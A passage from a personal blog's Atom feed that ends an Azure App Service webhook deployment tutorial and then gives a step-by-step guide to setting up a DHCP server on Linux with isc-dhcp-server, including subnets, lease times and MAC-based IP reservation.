&lt;img src=&quot;/assets/images/img-appservice/captura112.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And I’m going to reassemble the image.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura113.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And I’m going to push the image again.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura114.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;So going back to the portal heading over to the webhook rosource and click on “refresh”, we can see that we got a push action taking place.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura115.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And if we go to our app service in the “deployment center” section and select the log section, we can see the logs when we have published the image.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura116.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as you can see the changes have been applied correctly in my web app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura117.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Azure" /><category term="App service" /><category term="git" /><category term="github" /><category term="Azure devops" /><category term="Docker" /><category term="webhook" /><summary type="html">We are going to learn how the app service works and the possibilities it offers us to manage the hosting since the app service is still a hosting but the difference is that we can manage it.</summary></entry><entry><title type="html">Configure dhcp server in linux with isc-dhcp-server</title><link href="http://localhost:4000/isc-dhcp-server/" rel="alternate" type="text/html" title="Configure dhcp server in linux with isc-dhcp-server" /><published>2021-10-20T00:00:00+02:00</published><updated>2021-10-20T00:00:00+02:00</updated><id>http://localhost:4000/isc-dhcp-server</id><content type="html" xml:base="http://localhost:4000/isc-dhcp-server/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/servidor-DHCP-e1511228735448.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;we are going to learn how to configure a dhcp server in linux using the isc-dhcp-server service, we are going to learn: create a fixed ip for our server machine, create subnets, exclude ips ranges, create an ips address concession and finally make a reserved ip for a specific host with its mac address.&lt;/p&gt;

&lt;h2 id=&quot;what-is-a-dhcp-server&quot;&gt;What is a dhcp server?&lt;/h2&gt;

&lt;p&gt;Dynamic Host Configuration Protocol (DHCP), is a network management protocol that allows us to automatically assign IP addresses to client computers, default gateways, and other network parameters. allowing them to use network services such as DNS, NTP and any communication protocol based on UDP or TCP.&lt;/p&gt;

&lt;p&gt;To understand more clearly how the dhcp protocol works, the following diagram shows us how it works:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/dhcp.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;installing-dhcp-server-and-adding-fix-ip-address-in-our-server-machine&quot;&gt;Installing dhcp-server and adding fix ip address in our server machine.&lt;/h2&gt;
&lt;p&gt;Before configuring the dhcp server, we are going to install it with the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install isc-dhcp-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In my case I am going to assign a fixed IP address on the server machine. For this we will go to the path “/ etc / netplan” and then we will enter with the «nano» editor in the configuration file that haswithin that route. Inside the file we will put the following parameters:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;After we are going to save the changes to the file, we use the command “netplan apply” so that the ip is added to our server. And we use the command “ifconfig” to see if the ip address has been apply.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;configuring-our-dhcp-sever&quot;&gt;Configuring our dhcp sever&lt;/h2&gt;

&lt;p&gt;Once we have configured an ip for our server, we will go to the file “/etc/default/isc-dhcp.server”, where it says “interfacesv4 (ipv4 version)” we put the name of the network card where it will listen to the requests that we are going to configure. In my case I want it to assign the ips addresses in the “enp0s8” adapter on the client machines.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to create a subnet declaration specifying the ip range, open dhcp configure file (“/etc/dhcp/dhcpd.conf”). what we have to do inside a subnet declaration and then with the command «range» we will first put the lowest ip (in my case it is 10) the second the highest ip ( which in my case is 200).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To add any changes it is important to &lt;strong&gt;&lt;em&gt;restart&lt;/em&gt;&lt;/strong&gt; the dhcp service with the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service isc-dhcp-server restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the same configuration file we can establish the default time that an IP address is going to be lend (defualt-lease-time) and the second would be the maximum rental time of an IP address (max-lease-time). In my case, in both, the time is 1 and 3 hours, which I have indicated in seconds.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If in the case that we want to exclude ip ranges, within the same subnet declaration, we are going to specify which range of ip we want to exclude, for example in my case what I did is within the subnet declaration is to add a new range ip that is from 10 to 49 and change the ip range that I put previously, in this case it is from 61 to 200, and with this we exclude the ip range from 50 to 60.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;reserve-ip-for-a-host&quot;&gt;Reserve ip for a host&lt;/h2&gt;

&lt;p&gt;To reserve an IP with the mac address of a specific host, inside the dhcp configuration file we add a new host declaration (in my case I put the name of the client machine which is name “nafsuclient”) and with the command «hardware ethernet “we put the client’s mac address and with the command” fixed-address “we add the ip that we want to assign for that machine. once we done, save the file and restart de dhcp service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And this is my client machine, we can see that the mac address is the same as I have put in the configuration file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Before we have to make sure that the “isc-dhcp-client” service is installed on the client’s machine. If in the case that it is not installed we execute the following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install isc-dhcp-client
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the client machine that we are going to reserve the IP, we are going to use the following command so that it can carry out the process of obtaining the IP, indicating the network adapter that will obtain the IP that we put on the server.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then in the client machine, we turn off and on the adapter that will get the ip (in my case it is 8).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We use the “ifconfig” command on the client machine to verify that we have added the ip that we declared on the server.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-dhcp/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion we have been able to learn some concepts of the dhcp protocol, and also how to administer the dhcp service in linux in a very easy and fasty way.&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="dhcp" /><category term="isc-dhcp-server" /><category term="Linux" /><summary type="html">we are going to learn how to configure a dhcp server in linux using the isc-dhcp-server service, we are going to learn how to create subnets and make reserved ips.</summary></entry></feed>